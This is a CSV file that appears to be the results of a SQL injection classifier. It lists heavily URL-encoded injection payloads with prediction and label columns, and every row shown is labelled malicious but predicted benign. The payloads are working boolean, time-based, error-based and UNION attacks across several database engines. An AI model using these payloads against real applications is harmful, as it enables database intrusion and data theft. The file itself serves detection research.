,Query,Prediction,Actual
11055,"1' %20)%20 %20a%73 %69r%73h w%68ere%20 %32*%33-%36+2%2f2%2d1%2b4%397%33+%53IN%280%29+2/2%2d1+%38-8%3d4%3973+2/2%2d1+0+%53IN(0%29+%53IN(0%29+0 OR%208%2d8 %6fR %38-8%20O%52 %208-8%2b75%352+%38-8%2b2/%32-%31=SI%4e(%30)%2b(%2bSI%4e(%30)+%32/2%2d1  s%65lect%20c%6fun%74  (  *%20 %29 %20 %66rom%20r%64b%24fi%65l%64s%20a%73 %741%2crd%62$t%79p%65s %61s%20t2%2crdb$co%6cla%74ion%73 %61s t3,%72d%62$%66u%6ectio%6es %61s t%34  )%20 -%2d ",0,1.0
11056,"1%25'%20AN%44 %31 aNd 1%20A%4eD%20 %30+%365%337%2b8%2d8%3d2%2f2-1+d%62m%73_%70i%70e%2ereceive%5fm%65s%73a%67e+0%20 (%20 c%68r%20 %28  7%36 %20)%20 ||chr%20 %28 %201%316 %20)%20 ||chr  (%20 1%317 %20)%20 ||ch%72 %20(  %365%20 %29 %20,%35 %20) %20 and  %27%'+%30+%53I%4e(%30)%2b0+2%2a3-6%3d2%2f2%2d1+%27+%38-%38+%53I%4e(0) ",0,1.0
11057,%31 %20)%20  as%20mp%6ej%20w%68ere  SIN(0)+0%2b5%304%39+2/2%2d1+2/2-1=5%3049+0+%32/2-%31+%38-8 ,0,1.0
11058,1'  %29 %20 %61s%20h%71aq%20w%68ere%20 %38-8+2*%33-6%2b641%31+%32*3%2d6%2b0+%32*3-%36=2%2f2%2d1+6%341%31+SI%4e(%30)%2bSI%4e(0%29+%53IN(0%29 %41n%64 1 %61n%64 %31 && %202%2f2-1%2b8%359%34+0=%32*3%2d6%2b(%2b0+%32*3%2d6+%32/%32-1%2b2%2a3%2d6  %73e%6ce%63t %385%394 f%72o%6d %70g%5fsl%65ep%20 %28  %35 %20 )    %29 %20 %2d-%20,0,1.0
11059,"%31' %20) %20 A%6ed%201%20A%4eD%201%20a%4ed%20u%70dat%65x%6dl%20 (%20 %333%393,%63o%6eca%74 %20(  0x2%65,%30x71%371%3706%6171%2c %20(%20 se%6ce%63t%20 %20(  %65lt %20( %20 %30+0%2b8%2d8%2b3393=2*%33-%36+S%49N%280)%2bS%49N(%30)+%30+%32/2%2d1%2b339%33,%31 %20 )%20 %20 ) %20   %29  %2c0x71%37a%3767a7%31  %29 %20,%31161%20 )%20  ",0,1.0
11060,"%2d9%3031%25 ""%20 )   %6fr%64e%72 %62y%201%2d-%20",0,1.0
11061,"%31 %20)   %61s %6aq%62v%20w%68e%72e%20 S%49N(0)+8-8+%381%372+S%49N%280)+%38-%38=%38-8%2b2*3%2d6+8-8+2/%32-1+%381%372 A%6ed %31 An%64  %38-%38+%381%348+%38-%38+%32*3-%36+2%2a3%2d6%3d2/2%2d1%2bSIN%280%29+l%69k%65  %28  %27ab%63de%66g',%75pp%65r %20(%20 hex  %28 %20ra%6ed%6fm%62l%6fb%20 %28  50%3000%30000%2f2 %20 %29  %20 %29  %20  %20)%20 %20 %29 %20 %2d- ",0,1.0
11062,"%69if%20 (  %208-%38+%38-%38+9%313%34+8%2d8+2%2f2%2d1=%3573%36,1%2c1/%30+8-8%2b2%2a3%2d6  )%20 %20",0,1.0
11063,%31' %41N%44 %31 %41nd%201%20aND%20 SI%4e(%30)+%30+%32006+%32*3%2d6=%53IN%280)+2%2f2-%31+%32/%32-%31+8%2d8+%32006 ,0,1.0
11064,"1, %20(  c%61st%20 %20(%20  %20(%20 %20chr%20 ( %201%313 %20)%20 |%7cc%68r %20( %201%313%20 )%20 ||chr  %28 %201%312  )  %7c|ch%72  (%20 106 %20)  %7c|%63hr%20 %28  %311%33 %20 )%20 %20 ) %20 Or %53I%4e(0%29 %7c|  %28 %20selec%74 %31 %66r%6fm%20g%65n%65ra%74e%5fs%65r%69es  (  8979%2c8979,%63as%65 w%68en%20 %20(%20  %38-%38+%38-%38+%3897%39+8-8%3d8%2d8+%389%379+%38-%38+%53I%4e(%30)%20 %29  %20t%68e%6e 1 el%73e%200%20end %20) %20 limit 1%20 )%20 :%3atex%74|%7c %20(  chr %20(  %3113  ) %20||%63hr%20 %28  12%32 %20)%20 ||%63hr%20 ( %20118 %20)%20 %7c|c%68r  (%20 %3122%20 %29 %20|%7cc%68r%20 (%20 %311%33 %20 ) %20  )  %20 %61s numeric %20 %29  %20 %29  %20 ",0,1.0
11065,%31' %4fr%202%2f2-1%20OR %208-%38+%38-8+%3964%33+%38-%38+%32*%33-6+SIN%280%29=%38-%38+%28+%32/2-1+0%2b2%2f2%2d1+%53IN%280)%20 %73e%6cect coun%74  (%20 *%20 )   from%20do%6dain%2ed%6fm%61in%73 %61s %741%2cd%6fma%69n%2ec%6fl%75mn%73 %61s %742%2cd%6fm%61in.tab%6ces%20a%73 %743  %29 %20 A%4eD %31 A%4eD 1%20aND  %53I%4e(%30)+%27m%76kg'+SI%4e(%30)+%32*%33-6%2b2%2f2-1+%32/2-%31=%32/%32-%31+'%6dvkg+2*3-6 ,0,1.0
11066,"%2d15%325%27 %20 %29 %20  )%20  %20 )%20  %75ni%6fn al%6c sel%65ct 4%311%30,%3411%30,%34110,%341%310%2c4%311%30,41%310#%20",0,1.0
11067,1%27 %20)%20 %20OR %30 %6fr%202*%33-%36 O%72  %32*%33-%36+%349%315+8%2d8+%38-%38=%30+(+SI%4e(%30) %20s%65lec%74 %63ount%20 (  %2a  %29 %20 fro%6d domai%6e.%64om%61in%73 as %741%2cd%6fm%61in%2ec%6flumn%73 as %742%2cdo%6da%69n.%74able%73 as%20t3 %20) %20-%2d ,0,1.0
11068,"1%25'%20  )  %20 ) %20   )%20 %20A%6ed%201%20a%4ed  %32*3-6+%30+%338%324+2/%32-1+8-%38+8%2d8%3d8-8%2bSIN%280)%2bbe%6ec%68m%61r%6b  %28 %2050%300%300%30,%6dd5  %28 %200%78765%355%364%32  %20)%20 %20 ) %20 %20a%6ed%20 %20 %28 %20  %28  %20 %20( %20 8-%38+2%2a3-%36+'%'%2b8-%38+2%2a3-%36+8-%38=%38-8%2bSIN%280)%2b'%2bSI%4e(0)+%53IN(%30)+2%2f2%2d1 ",0,1.0
11069,1 %22 %20)  %20wh%65r%65 %208-%38+SI%4e(%30)%2bS%49N%280)+%32/2-%31+33%321+%32*%33-%36=2/%32-%31+%3332%31+%32/%32-1 ,0,1.0
11070,1'+%20 (%20 s%65l%65c%74 nsr%69 w%68ere%20 %53I%4e(%30)+%38-%38+%312%302%2b0+S%49N(0)+%32/2%2d1%3d2%2f2-1%2b8%2d8+%32/%32-1+%30+120%32 aN%44 %31 an%64 %20S%49N%280%29+%345%395+%32/%32-1=%32/%32-1+%3459%35+2/2-%31+2%2f2-%31 #,0,1.0
11071,"%31'+%20 %28  %73e%6ce%63t%20xl%76q w%68e%72e%20 2*%33-6%2b0+74%370=0%2b7%3470%2b8-%38+2/2%2d1%2b8-%38 %61nd 1%20AND%20 %38-8%2b2%2f2-%31+3%370%37=(%2b0+2%2a3%2d6%20 %73elec%74 %63ou%6et%20 (  * %20)   fr%6fm%20sy%73i%62m%2es%79s%74a%62l%65s a%73 %741,sy%73i%62m.%73y%73ta%62le%73 a%73 %742,%73ys%69bm.sys%74a%62l%65s %61s t3%20 %20)%20  %20)   %2b'%20",0,1.0
11072,"-1%3204%27 %20 )%20 %20 %29 %20 %20union %61ll se%6ce%63t%203%358%35,3%3585-- ",0,1.0
11073,1%20 )%20  %77h%65re%20 %32*%33-%36+0%2b4%371%31+%30+%30=S%49N(%30)+8%2d8+8%2d8%2b2%2a3%2d6%2b4%3711+%53I%4e(0) ,0,1.0
11074,%2d7491 %22 %20) %20 as %63nrn%20whe%72e%20 %53IN%280%29+%32*3-%36+3%363%35+%53IN%280%29+0+%38-8=%53IN%280)%2bS%49N%280%29+2%2a3-%36+%33635%2b8%2d8+%38-%38 %6frd%65r %62y%201%23 ,0,1.0
11075,"-80%307%27 whe%72e  2%2a3%2d6%2b9649%2b2/%32-1%2b2%2f2%2d1%2b8-%38=0+%396%349+%32*3%2d6+%30+2%2a3%2d6%2b2/%32-%31 u%6eio%6e %61l%6c s%65l%65c%74 %39649,%3964%39,%3964%39,%3964%39,%39649,9%3649,%39649%2c9%3649,%396%349-%2d ",0,1.0
11076,"%31 %20)   %61ND 1%20A%6ed%20 %30+3%370%37+2*%33-%36+2%2a3%2d6%2b8%2d8%2b8-8=SIN(0)%2b(%2b8-%38  s%65l%65ct %63ou%6et %20(  %2a  %29 %20 %66ro%6d %73ys%69bm%2esy%73tabl%65s%20as t%31,%73y%73ib%6d.%73y%73t%61bl%65s%20as%20t%32,%73ysibm.s%79s%74a%62l%65s %61s%20t%33 %20)%20  ",0,1.0
11077,"%2d21%390%27 %20)   wher%65  2/%32-%31+88%390%2b8-%38=2%2a3%2d6+2%2f2-1+%388%390%2b0%2bSI%4e(0)%20uni%6fn a%6cl%20sel%65c%74 88%390,%388%390%23 ",0,1.0
11078,1' %20 )%20 %20 )%20   AND %31 a%4ed%20  %28   %32/2-1+%32/%32-%31+%330%320%2bS%49N%280)=%53I%4e(0%29+%53I%4e(0%29+3020+S%49N%280)+%32/2%2d1%2bS%49N%280)  ) %20*670%33 an%64 %20  (  %20 %28 %20 %27vv%6bd' %6cike%20'%76v%6bd%20,0,1.0
11079,%2d42%362%%27   ) %20 %20)%20 %20  ) %20 O%52 %30 O%72 %30 %4fr%20 2%2f2-%31+%38-%38+2%2a3-%36+47%347%2bS%49N(0%29+8-8%3d2%2a3%2d6%2bdbms_%75t%69li%74y%2esq%6ci%64_to_s%71lha%73h%2bSI%4e(%30)+0%2bSI%4e(0)%20 %20(    %28  %20chr  (%20 %311%33 %20)%20 %7c|%63h%72 %20(  %3113%20 )%20 |%7cch%72  %28  %3112  %29  |%7cchr%20 (%20 %310%36 %20) %20||chr%20 (  113%20 %29 %20|%7c  %28 %20s%65l%65c%74 %20 (  %63a%73e%20w%68e%6e %20 (   %30+2%2f2%2d1+2%2a3%2d6%2b474%37+%53IN(0%29=%32*%33-6+%32/%32-1%2b47%347  %29 %20 t%68e%6e %31 els%65 0%20en%64  %29   f%72o%6d d%75al%20 )  ||chr %20(%20 %311%33 %20)  %7c|c%68r %20(  122%20 )%20 %7c|%63hr%20 ( %20118%20 %29  ||%63hr %20( %201%322  ) %20||%63hr%20 %28  %3113%20 %20) %20  ) %20 %20 %29 %20 %41N%44 %31 %61Nd %20 %20(  %20 %28     %28   2/%32-1+%38-8%2b'%25'%2b8%2d8+%32/%32-%31=%53I%4e(%30)+%32/%32-1+2/2%2d1+0+%27+%38-%38 ,0,1.0
11080,"%2d1%3043 ""  )   %77h%65r%65  8-%38+4%3207+0+S%49N%280%29+2%2a3%2d6%3d42%307%2b2%2a3-6%2b2*%33-6%2b2/%32-%31 %7c| 8%2d8 Or%208%2d8%20|| 2%3724%20in%20 %20 (%20  %20(   %63har%20 %28  1%313%20 )%20 %2bc%68ar%20 (%20 %3113%20 %29 %20+ch%61r %20(  %311%32 %20) %20+%63har%20 %28 %20106 %20) %20+%63ha%72  %28 %2011%33 %20)%20 %2b %20(  se%6ce%63t  %20(%20 case%20when  %20(%20 %202%2f2%2d1+2%2a3-6%2b2%372%34+8-%38+2%2a3-6%3d2*%33-6+2%372%34+%32*%33-%36  )%20 %20t%68e%6e ch%61r%20 %28 %204%39 %20)   el%73e%20cha%72  %28  %348 %20) %20 en%64  %20)%20 %20 )  %20+ch%61r  %28  1%313 %20)%20 %2bc%68a%72  ( %20122%20 ) %20+c%68a%72  (  1%318%20 ) %20+%63ha%72 %20(  1%322  )%20 +c%68a%72 %20(%20 1%313   %29  %20 )%20  %20 )%20 -%2d ",0,1.0
11081,"1   %29    %29 %20 %20 %29   aN%44 1%20an%64  8%2d8+0%2b6%305%35+%53I%4e(0%29+S%49N%280%29+2/2-%31=%32/%32-%31+%30+%38-8%2bctxs%79s%2edri%74hs%78.%73n%2b8%2d8+2*3-6%20 %28  6%305%35,  (%20 ch%72  (  1%313%20 %29 %20||c%68r%20 (  %311%33  %29 %20|%7cc%68r  ( %201%312%20 ) %20|%7cchr %20(  106%20 %29  %7c|%63h%72 %20(%20 1%313  ) %20or 2%2f2-1%20o%52 %20(%20 se%6ce%63t %20 %28 %20case%20w%68en %20 %28 %20 2%2f2-1+%3605%35+2%2a3-6%3d8-%38+%360%355%2b2%2f2-%31+2%2a3-%36  )%20 %20t%68e%6e 1 %65l%73e%200 %65n%64 %20)   %66r%6fm %64ual  %29  %7c|chr%20 %28  %311%33  )%20 %7c|%63h%72  (%20 %3122 %20)%20 %7c|%63h%72  %28 %2011%38 %20)%20 ||c%68r %20(  12%32  %29 %20||chr  %28  %311%33  %20)  %20 %29 %20   %29 %20 %61nd%20 %20 %28  %20 (%20 %20 %20(%20 %20S%49N%280)%2bS%49N(0)%2b6%339%35+2%2a3%2d6%3d0+8%2d8%2b2%2f2%2d1+2%2f2%2d1+%38-8%2b6395%20",0,1.0
11082,"ii%66 %20(%20  2%2f2-1%2b8-%38+13%305+8%2d8+8%2d8+8%2d8%3d2/2-1%2b0%2b5%365%36,1%2c1%2f0%2b2%2f2%2d1  %29   ",0,1.0
11083,"%31'  )  %20a%4eD%201 %61N%44 %202*3%2d6+8%2d8%2b6%3537%3d8%2d8+2%2a3%2d6+d%62m%73_p%69pe.r%65c%65ive%5fme%73sag%65 %20(%20 ch%72  %28  %376%20 %29  ||%63h%72 %20(%20 1%316%20 %29 %20|%7cc%68r%20 (%20 %3117%20 %29  %7c|%63h%72  %28 %2065  %29 %20,%35 %20)   a%6ed%20  %28 %20 %38-%38+'ydxb%27+2%2a3%2d6%3d0%2b2*%33-%36+%32/%32-1+8-8+'%79d%78b%2b2%2f2%2d1 ",0,1.0
11084,"%2d9%346%32 ""%20 %29  %20as%20v%7aga %77h%65r%65 %204%3799+2*3%2d6%2b8-%38+%32/2-1+%53I%4e(%30)%2b2%2f2%2d1%3dSI%4e(0)+2/2-1%2b4%3799+%32/%32-%31+2%2a3%2d6 %4fr%202%2f2%2d1%20OR %32*3-%36 %6fR%20 %30+%38-%38+%38691%2b8-%38+0+%32*3%2d6%3d8%2d8+%30+%310%348+8-%38+8-%38 ",0,1.0
11085,"-623%36'%20 %20) %20 %20)  %20  )   o%52 8%2d8 |%7c %30 OR 2/2-%31 OR%201 gr%6fu%70 %62y c%6fnc%61t%20 ( %200%7871%3717%306a%371%2c %20( %20s%65l%65ct%20  (%20 cas%65 w%68en  %20(%20  %30+4%3232+%32/2%2d1=%53I%4e(0)%2b423%32+%30+SIN%280%29+%30+%30 %20)%20 %20t%68en%201 el%73e%200%20e%6ed   ) %20  )   %2c0%787%317%6176%37a%371,%66l%6for  ( %20ran%64 %20( %200%20 )%20 *2%20 %20)  %20 %29 %20  %68a%76ing%20m%69n %20(%20 0  )  #%20",0,1.0
11086,"%31   ) %20 %20)     %29 %20 u%6eio%6e a%6cl %73e%6ce%63t nul%6c,null%2cn%75ll,%6eul%6c#%20",0,1.0
11087,%31'|%7c %20(%20 s%65l%65ct %27b%68x%78'%20w%68er%65 %200+8%2d8+2585+S%49N(0)%2b2%2f2-1=2%2f2-1+25%385%2b2*3%2d6%2bSIN(%30)+%38-8 ,0,1.0
11088,"%2d4%323%36'%20 )  %20un%69o%6e %61l%6c sel%65ct 207%36,%320%376,%320%376%2c2%307%36,%32076%2c2%3076,%3207%36,20%376,%3207%36,%320%376%23 ",0,1.0
11089,"1%27 %75n%69o%6e %61l%6c %73e%6cect%20null%2cnu%6cl,nul%6c,%6eu%6cl%2cn%75ll%2cnu%6cl,%6eul%6c,null%2cn%75l%6c# ",0,1.0
11090,-%342%319%27 %6fR%20S%49N%280) Or%202/2-%31 o%72 2%2f2-1%20o%52 %327%324 %69n%20 %20 (  %20 %28 %20 %63har  (%20 %311%33  %29  %2bc%68a%72  (  %3113  %29 %20+%63har  %28  %311%32  ) %20+%63h%61r  (%20 106%20 )%20 +c%68ar%20 %28 %201%313 %20)%20 %2b  (%20 se%6cec%74  %20(  %63a%73e%20w%68e%6e %20 (   %32*3%2d6%2b0+%53I%4e(0)%2b2%3724%2b2%2a3-%36+%38-%38=%38-%38+%38-%38+2%372%34+%53I%4e(0%29+%32*%33-%36  %29 %20 %74h%65n %63h%61r %20( %204%39 %20) %20 else%20c%68a%72 %20( %204%38 %20)%20  %65nd%20 %20)%20 %20 ) %20 +%63har%20 %28  113 %20)%20 +%63h%61r %20(%20 %312%32  %29  %2bc%68ar%20 %28 %20118  )%20 +%63h%61r%20 (  1%322  ) %20+ch%61r %20(%20 113%20  )  %20 )  %20  %29 %20,0,1.0
11091,"-%367%378 %20)%20 %20as x%75t%6d wh%65r%65 %202%2a3-6+2%2f2%2d1+%3644%32+%53IN(%30)=2%2f2-%31+%38-%38+6%3442%2b2%2a3%2d6+%53IN%280)+%32/%32-1 %75n%69on %61ll %73elect%20644%32,%36442%2c64%342,%36442,6442,6%3442%23 ",0,1.0
11092,"%31 ""%20w%68e%72e %202/2-1+2*%33-6+%32/2%2d1%2b2%2f2%2d1%2b991%39+%38-%38=%32/2-1%2b9%391%39+%53I%4e(0)%2b8%2d8 ",0,1.0
11093,"-%3920%39%%20"" %20 %29 %20  %29 %20  %20)%20 %20un%69o%6e %61l%6c %73el%65c%74 %337%336%2c3736%2c3%3736%2d-%20",0,1.0
11094,"1%27  %29  %20w%68e%72e%20 2/%32-%31+%347%350+2%2f2%2d1%2b2*%33-%36+%32*%33-%36+%53I%4e(0%29=%53IN%280%29+4750%2b8-%38+%32/2-%31+%32*%33-6%20a%4eD%201%20AN%44 1 %41N%44 exp%20 (  %7e %20(%20 sel%65c%74 * %66r%6fm %20 (%20 %73elec%74 %63o%6eca%74  (%20 %30x%3717170%36a7%31,%20 ( %20s%65l%65ct %20 ( %20elt%20 (%20  %32/2%2d1%2b8-%38+2/%32-1+8190+2/%32-1%3d2%2f2-1%2b8%3190,1+2%2f2-%31+%32*%33-6   )%20  %20)%20  %20 %29 %20,0x7%317a7%367%617%31,%30x%378   %29 %20 %20)%20  x %20 ) %20  %29 %20 -- ",0,1.0
11095,%31'%20 )%20  a%73 k%71b%68 w%68ere%20 %361%338+2*3-6%2b2/2%2d1%3d613%38+8%2d8+%53I%4e(%30)%20,0,1.0
11096,"1 %22 %77he%72e  40%364+%53IN(0%29+%32/%32-%31=%3406%34+2%2f2%2d1%2b2/%32-1%20A%6ed%201 %61N%64 %202*%33-%36+%32*%33-6+8%2d8+4241+%38-%38=%63onve%72t%2b8%2d8%2b2%2f2%2d1  %28 %20in%74, %20( %20s%65l%65ct %63h%61r  (%20 1%313  )%20 %2bc%68ar%20 %28  %3113%20 %29 %20+c%68ar%20 (%20 1%312 %20)%20 %2bcha%72  ( %20106%20 )%20 %2bchar%20 ( %2011%33  )%20 + %20(  %73e%6cec%74 %20 ( %20ca%73e%20when  %20(%20 %200+42%341+2%2f2-1%3d2%2a3%2d6+%342%341%2b0%2b0  )%20 %20then%20ch%61r %20(%20 %349  ) %20 e%6cs%65 c%68a%72  (%20 48 %20)%20  end%20 %20) %20  %29   %2bch%61r %20(%20 %311%33  %29  +c%68ar%20 %28  122  )%20 %2bch%61r%20 (%20 %311%38 %20) %20+%63har %20(%20 1%322  %29  +ch%61r%20 %28 %20113%20  )    )%20  %20 %29 %20-- ",0,1.0
11097,%31 %22 %77h%65r%65  8-8+%30+SIN(0)+5%309%38=%32*%33-6+0+%30+%32/%32-%31+5%309%38 %61ND %31 aN%64  %32/2-1+2%3853+0+%30=2*%33-%36+0%2bcast%2b2%2a3-%36+%32*3%2d6   (%20   (%20 %20c%68r%20 %28  113 %20) %20||%63hr%20 (%20 1%313 %20) %20|%7cc%68r%20 %28 %20112%20 %29  |%7cchr%20 %28  106%20 %29  ||%63hr %20(  1%313%20  )%20 %20 %29   %7c|%20S%49N(0%29 %6fr%20 (%20 %73e%6cec%74  %20(%20 c%61s%65 whe%6e %20 %28 %20 %32*%33-%36+2*3%2d6%2b2/%32-%31+2%3853%2b2*3%2d6+2*%33-%36=0+0%2b2853+%53IN(0) %20)   th%65n 1%20e%6cse 0%20e%6ed   )%20 %20 )%20  %3a:%74e%78t%7c|%20 %28 %20ch%72 %20(%20 %311%33  %29 %20||%63hr %20(%20 %3122%20 )%20 ||c%68r%20 (  1%318 %20)%20 |%7cchr%20 (  %312%32 %20) %20|%7cc%68r%20 %28  113   )%20   )%20 %20 %61s %6eume%72ic%20 )%20 %2d-%20,0,1.0
11098,"1%25'  )   a%4eD%201 %61N%64 m%61ke_se%74  (  %20SI%4e(0%29+2%2f2%2d1%2b2%2f2-%31+%384%303=%38-8%2b2/2-%31+%384%303,8%389%39+%38-8+8-%38+%32/2%2d1%20 )%20  %61n%64 %20 %28 %20 0+S%49N%280)%2b'%%27=8-%38+%32/2%2d1%2b2%2a3-%36+%27+2/%32-1 ",0,1.0
11099,"%31 %6fR 8-8%20o%72 SI%4e(0)%20o%52  %30+%37427+8%2d8%3dSI%4e(%30)%2bd%62ms%5fpipe%2er%65ce%69v%65_m%65s%73a%67e+%30  %28 %20chr %20( %201%316  %29 %20|%7cch%72  %28 %208%37 %20) %20|%7cchr%20 (  90%20 ) %20||%63hr  (  1%309  %29 %20,%35 %20)  %2d-%20",0,1.0
11100,%2d4%3979%27  %20)   %20)   %20O%52 %32*3-6 o%52 2/2%2d1 O%52  2%2a3-6+%34493+2%2f2-1+%38-%38+%38-%38=%38-%38+utl_%69na%64d%72.g%65t%5fh%6fst_%61ddress+8-%38  (  c%68r%20 %28 %201%313 %20)  %7c|chr%20 %28  1%313  )  %7c|%63hr  ( %2011%32  ) %20|%7cch%72  (  10%36  %29  %7c|c%68r %20(%20 %3113%20 )%20 %6fR 8%2d8 || %20(  s%65lec%74   %28  c%61s%65 whe%6e  %20(%20 %20SI%4e(0)%2b8-%38+SI%4e(0)%2b44%393+%38-8+2/2-1%3d8-8+8-%38+%344%393 %20) %20 %74h%65n%201%20el%73e %30 e%6ed %20)%20 %20f%72o%6d du%61l%20 )%20 %7c|c%68r%20 (  1%313  )  |%7cchr%20 %28 %20122%20 %29 %20||%63hr %20(%20 118  %29 %20|%7cchr%20 %28  1%322%20 %29  ||%63h%72  (%20 %3113%20  %29   %20)%20 %20 %61N%44 1%20AND%20 %20 %28    %28  %20 'o%66g%67'+%53I%4e(%30)%2b2%2f2-%31+%32*3-6=0%2b0%2b'%6ffgg%2b8-%38+8%2d8 ,0,1.0
11101,"-%384%377%27 %75n%69o%6e al%6c sel%65ct %325%317,2%3517,251%37--%20",0,1.0
11102,"1%20""  %20)%20  %20)  %20 %6fr%200%20o%52 2/%32-1 o%72 2/2-%31 %6fr%20 SIN(%30)%2b6979%2bS%49N%280)=%32/%32-%31+2%2f2%2d1+%32/2%2d1+l%69ke+%32*3-6%2b2*3-6%20 (%20 %27a%62c%64ef%67'%2cu%70p%65r %20(  h%65x %20(%20 %72a%6ed%6fmb%6cob%20 (%20 5%300%3000%300%30/2  %20) %20  %29 %20 %20  )%20 %20 )%20  -%2d ",0,1.0
11103,%31 %22 w%68ere %202*3%2d6%2b2/%32-1%2b4319%2b2%2a3%2d6%3d0%2b4%3319%2bS%49N(%30)+%30 ,0,1.0
11104,1%27 %77her%65  2/%32-%31+SI%4e(%30)+%30+%390%324+%32*%33-%36=%32/2%2d1%2b8-8%2b9024%20r%6cike%20  %28 %20se%6ce%63t%20* %66r%6fm%20 %20(%20 %73e%6cec%74 %20( %20s%6ce%65p%20 %28  5%20  %29    %29   %20 %29 %20s%67v%6f %20) %20--%20,0,1.0
11105,"%31'%20 %29   a%73 %6cjpy%20w%68ere %202%2f2-1+%53IN(%30)%2b8-%38+2%2a3%2d6+%382%370=%53I%4e(%30)+%30+%382%370+%32/2-%31+%38-8+%38-%38 %6fR 8-8 %4fr %32/%32-1 oR  %20(  %73e%6cec%74 %3917%33 f%72o%6d  %28 %20sel%65c%74 %63ount  ( %20*%20 ) %20,%63o%6eca%74 %20(%20 0x%371%371706a%371,%20 (%20 sele%63t%20 %20( %20elt%20 %28  %200%2b0+91%373%2b0%2b2/%32-%31=%53I%4e(0)+9173,1+0+SIN(%30) %20 %29 %20  %29  %20 %20)%20 ,%30x71%37a76%37a%371,%66loo%72  (  %72an%64  %28 %200%20 )%20 %2a2  %20)  %20 )%20  %78 %66ro%6d inf%6fr%6da%74io%6e_%73chema.%63ha%72act%65r_%73e%74s%20grou%70 %62y x%20 %29 %20a  %29 %20-- ",0,1.0
11106,"%31'   %29 %20  ) %20  %4fr%20SI%4e(0%29 %6fR%202%2a3%2d6%20or%20 8%2d8+S%49N%280%29+%375%352%2b2%2f2%2d1%3d(+S%49N%280)%2bS%49N%280%29 %20sele%63t c%6fu%6et%20 ( %20* %20)%20  f%72om%20r%64b%24f%69el%64s%20a%73 t%31,r%64b%24types%20as t2,r%64b$%63o%6cl%61ti%6fn%73 a%73 t3%2crdb$f%75n%63t%69ons %61s %744 %20)%20  %61nd%201%20And%20 %20 %28 %20 %20(%20 %20 %30+%32/%32-%31+%38-%38+%27u%77rm%27+2/%32-%31+2*3%2d6=8-%38+'%75wr%6d+%32/%32-%31 ",0,1.0
11107,"1%27  %20)%20 %20 %29   %20a%4ed 1 %61nd%201 %41N%44 %208-%38+%38-8%2b851%34+%32*3%2d6+2/2-%31+%53IN(0)%3dSI%4e(%30)%2b(%2b8-%38+%32/2-%31+%30 %20s%65lect %63ount%20 ( %20* %20)  %20fr%6fm %64om%61i%6e.d%6fm%61i%6es %61s%20t1,do%6dain.c%6flu%6dn%73 as t%32,d%6fm%61i%6e.tables%20as%20t3%20 %29   %61nd    ( %20  (%20  %27i%63a%6e'%20l%69k%65 %27i%63a%6e ",0,1.0
11108,%31' %20)   %61s %6dar%61 wh%65re %202%2a3-%36+%37164+2%2f2-%31+SI%4e(0)%2b2*%33-%36=%30+%30+%53I%4e(0)%2b2%2a3%2d6%2b71%364%2b2/%32-1%20,0,1.0
11109,-%383%359%20 %29 %20 whe%72e  %38-8+%30+4%3430%2bS%49N%280)+%38-%38+%30=%32*3-%36+2*3-%36+S%49N%280%29+44%330%2b0+%32/%32-1 O%52 %32*3%2d6 O%52 S%49N(%30)%20||%200%20or  %368%372+2%2a3-6+2%2a3-6%3d2/%32-%31+%32*3-%36+%53I%4e(%30)%2b6%387%32--%2bS%49N(%30)%20,0,1.0
11110,"%31'%20  %29 %20 %20)%20  %20a%73 o%76b%7a %77he%72e %202/2-1+%332%303%2bS%49N(0)%2b2%2f2%2d1%3d8%2d8%2b2/%32-1+%332%303%2bS%49N%280)%20 %20( %20s%65l%65ct %20 (%20 cas%65 w%68e%6e  %20( %20 S%49N(0)+4%3587%2bSI%4e(%30)=2/2%2d1%2b0+45%387+2/%32-%31+%32*%33-6+8-%38 %20)%20  t%68en %72e%67e%78p_%73u%62s%74ring%20 (  r%65p%65a%74  %28  le%66t%20 (%20 %63ry%70t_ke%79 %20(%20 c%68ar %20( %206%35  )  ||%63h%61r%20 %28 %206%39 %20)%20 |%7cch%61r%20 %28  %383%20 %29  %2cnull%20 )%20 %2c0%20 )%20 %2c500%300%300%300%20 )%20 ,%6eull%20 )   else char%20 (%20 76%20 %29 %20||%63ha%72 %20(%20 %365%20 )%20 %7c|%63h%61r%20 %28 %201%302  ) %20|%7cc%68a%72 %20(  72%20 %29 %20 %65n%64  )%20  f%72o%6d   (  v%61lu%65s  ( %200%20 %20) %20 %20)%20  %20 %29 %20-- ",0,1.0
